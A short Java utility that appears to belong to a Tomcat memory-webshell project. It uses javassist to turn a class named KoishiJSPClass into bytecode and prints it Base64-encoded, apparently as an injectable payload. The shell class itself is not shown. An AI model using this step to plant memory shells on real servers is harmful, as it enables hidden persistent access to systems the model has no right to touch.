package com.tomcat.memshell.JSPMemShell;

import com.tomcat.util.ClassUtil;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.NotFoundException;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;

public class generateCode {
    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
        byte[] bytes = ClassPool.getDefault().get(KoishiJSPClass.class.getName()).toBytecode();
        String encode = new String(Base64.getEncoder().encode(bytes));
        System.out.println(encode);

    }
}
